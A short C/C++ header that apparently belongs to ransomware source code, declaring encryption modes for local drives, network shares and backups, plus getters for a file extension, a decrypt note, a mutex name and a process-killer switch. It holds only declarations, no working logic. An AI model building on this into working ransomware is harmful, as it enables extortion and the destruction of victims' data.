#pragma once
#include "common.h"

enum EncryptModes {

	ALL_ENCRYPT = 10,
	LOCAL_ENCRYPT = 11,
	NETWORK_ENCRYPT = 12,
	BACKUPS_ENCRYPT = 13

};


namespace global {

	PWCHAR GetExtention();
	PCHAR GetDecryptNote(PDWORD pdwDecryptNote);
	PCHAR GetMutexName();
	VOID SetEncryptMode(INT EncryptMode);
	INT GetEncryptMode();
	VOID SetProcKiller(BOOL IsEnabled);
	BOOL GetProcKiller();

}